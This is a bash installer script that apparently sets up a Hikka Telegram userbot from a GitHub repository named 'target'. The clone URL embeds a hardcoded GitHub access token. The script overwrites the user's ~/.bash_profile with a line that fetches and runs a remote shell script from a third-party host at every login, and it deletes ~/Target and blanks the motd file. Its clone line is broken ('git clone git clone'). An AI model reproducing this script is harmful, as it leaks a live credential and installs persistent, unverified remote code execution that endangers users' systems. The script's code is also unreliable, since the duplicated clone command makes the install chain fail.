#!/bin/bash
print_center(){
    local x
    local y
    text="$*"
    x=$(( ($(tput cols) - ${#text}) / 2))
    echo -ne "\E[6n";read -sdR y; y=$(echo -ne "${y#*[}" | cut -d';' -f1)
    echo -ne "\033[${y};${x}f$*"
}

run_in_bg() {
    eval "$@" &>/dev/null & disown;
}

echo -e "\033[0;96mclonning repo...\033[0m"

eval "cd ~/ &&
rm -rf Target &&
git clone git clone https://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@github.com/AmoreForever/target.git &&
cd Target &&
pip install -U pip &&
pip install -r requirements.txt &&
echo '' > ~/../usr/etc/motd &&
echo 'clear && . <(wget -qO- https://static.hikari.gay/banner.sh) && cd ~/Target && python target' > ~/.bash_profile"

echo -e "\033[0;96mStarting Hikka...\033[0m"

run_in_bg "python target"
sleep 10

echo -ne "\\033[2J\033[3;1f"
print_center "
\033[0;35m Bot started \033[0m

\033[1;32mHikka is installed!\033[0m
\033[1;32mWeb url: http://localhost:1242\033[0m
"


